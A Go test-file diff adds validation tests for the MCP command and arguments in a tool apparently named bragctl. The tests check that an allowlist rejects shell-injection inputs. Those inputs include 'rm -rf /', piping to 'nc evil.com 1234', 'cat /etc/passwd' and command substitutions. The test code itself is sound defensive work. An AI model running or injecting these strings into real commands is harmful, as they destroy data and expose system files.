@@ -202,3 +202,114 @@ func TestBaseDirWithValidBRAGCTL_HOME(t *testing.T) {
 		t.Errorf("BaseDir() = %q, want %q", baseDir, validPath)
 	}
 }
+
+func TestValidateMCPCommand(t *testing.T) {
+	tests := []struct {
+		name    string
+		cmd     string
+		wantErr bool
+	}{
+		// Valid commands
+		{name: "bare wtmcp", cmd: "wtmcp", wantErr: false},
+		{name: "bare wtmcp-dev", cmd: "wtmcp-dev", wantErr: false},
+		{name: "bare bragctl", cmd: "bragctl", wantErr: false},
+		{name: "absolute wtmcp", cmd: "/usr/local/bin/wtmcp", wantErr: false},
+		{name: "absolute bragctl", cmd: "/usr/local/bin/bragctl", wantErr: false},
+		{name: "absolute wtmcp-custom", cmd: "/opt/wtmcp-custom", wantErr: false},
+
+		// Invalid commands
+		{name: "empty", cmd: "", wantErr: true},
+		{name: "bare other", cmd: "evil", wantErr: true},
+		{name: "shell injection semicolon", cmd: "wtmcp; rm -rf /", wantErr: true},
+		{name: "shell injection pipe", cmd: "wtmcp | nc evil.com 1234", wantErr: true},
+		{name: "shell injection ampersand", cmd: "wtmcp && cat /etc/passwd", wantErr: true},
+		{name: "shell injection dollar", cmd: "wtmcp$(whoami)", wantErr: true},
+		{name: "shell injection backtick", cmd: "wtmcp`id`", wantErr: true},
+		{name: "shell injection parens", cmd: "wtmcp()", wantErr: true},
+		{name: "relative path", cmd: "./wtmcp", wantErr: true},
+		{name: "relative path dots", cmd: "../wtmcp", wantErr: true},
+		{name: "absolute non-allowed", cmd: "/bin/sh", wantErr: true},
+		{name: "absolute evil", cmd: "/usr/bin/evil", wantErr: true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validateMCPCommand(tt.cmd)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("validateMCPCommand(%q) error = %v, wantErr %v", tt.cmd, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestValidateMCPArg(t *testing.T) {
+	tests := []struct {
+		name    string
+		arg     string
+		wantErr bool
+	}{
+		// Valid args
+		{name: "simple flag", arg: "--verbose", wantErr: false},
+		{name: "path arg", arg: "/tmp/workdir", wantErr: false},
+		{name: "value", arg: "production", wantErr: false},
+
+		// Invalid args
+		{name: "shell injection semicolon", arg: "--arg; rm -rf /", wantErr: true},
+		{name: "shell injection pipe", arg: "arg | nc evil.com", wantErr: true},
+		{name: "shell injection dollar", arg: "$(whoami)", wantErr: true},
+		{name: "shell injection backtick", arg: "`id`", wantErr: true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validateMCPArg(tt.arg)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("validateMCPArg(%q) error = %v, wantErr %v", tt.arg, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestMCPCommandValidation(t *testing.T) {
+	// Test that invalid commands fall back to default
+	cfg := &Config{}
+	cfg.MCP.Command = "/bin/sh" // Invalid: not wtmcp or bragctl
+	cmd := cfg.MCPCommand()
+	if cmd != "wtmcp" {
+		t.Errorf("MCPCommand() with invalid command = %q, want default \"wtmcp\"", cmd)
+	}
+}
+
+func TestMCPArgsValidation(t *testing.T) {
+	// Test that invalid args are skipped
+	cfg := &Config{}
+	cfg.MCP.Args = []string{"--valid", "; rm -rf /", "--also-valid"}
+	args := cfg.MCPArgs()
+
+	// Should have --workdir, --valid, and --also-valid, but NOT the malicious arg
+	hasValid := false
+	hasAlsoValid := false
+	hasMalicious := false
+
+	for _, arg := range args {
+		if arg == "--valid" {
+			hasValid = true
+		}
+		if arg == "--also-valid" {
+			hasAlsoValid = true
+		}
+		if arg == "; rm -rf /" {
+			hasMalicious = true
+		}
+	}
+
+	if !hasValid {
+		t.Error("MCPArgs() missing valid arg")
+	}
+	if !hasAlsoValid {
+		t.Error("MCPArgs() missing also-valid arg")
+	}
+	if hasMalicious {
+		t.Error("MCPArgs() included malicious arg, should have been filtered")
+	}
+}
